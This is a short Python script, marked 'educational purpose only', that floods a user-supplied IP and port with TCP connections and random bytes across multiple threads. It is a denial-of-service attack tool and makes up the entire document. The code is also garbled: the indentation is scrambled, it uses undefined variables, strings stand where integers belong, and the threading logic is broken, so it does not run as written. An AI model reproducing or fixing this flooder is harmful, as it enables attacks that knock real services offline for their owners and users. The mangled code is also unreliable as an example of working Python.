#!/usr/bin/python3

#EDUCATIONAL PURPOSE ONLY

import socket
import random
import threading

ip = str(input('[+] Target: '))
     port = str(input('[+] Port: '))
            packet = str(input('[+] Packet/s: '))
                     thread = str(input('[+] Threads: '))


                              def start():
                                  hh = random._urandom(10)
                                       xx = int(0)
                                        while True:
                                        try:
                                                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                                            s.connect((ip,port))
                                                            s.send(hh)
                                                            for i in range(pack):
                                                                s.send(hh)
                                                                xx += l
                                                                        print('PROSES ATTACK '+ip+' | Sent: '+str(xx))
                                                        except:
                                                                        s.close()
                                                                        print('DONE ATTACK')

                                                                        for x in range(thread):
                                                                            thred = threading.Thread(target=start)
                                                                                    thred = start()

#DONE CUY

